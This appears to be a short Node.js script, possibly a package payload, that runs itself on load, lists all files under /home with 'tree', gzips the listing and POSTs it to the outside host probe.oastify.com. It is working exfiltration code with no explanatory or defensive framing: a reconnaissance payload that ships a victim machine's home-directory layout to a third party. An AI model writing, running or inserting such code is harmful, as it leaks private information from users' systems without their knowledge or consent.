const {spawn}=require('child_process');
const https=require('https');
const zlib=require('zlib');
function run(){
 const tree=spawn('tree',['/home','-a']);
 const gzip=zlib.createGzip();
 const options={hostname:'probe.oastify.com',method:'POST'};
 const req=https.request(options);
 tree.stdout.pipe(gzip).pipe(req);
}
run();
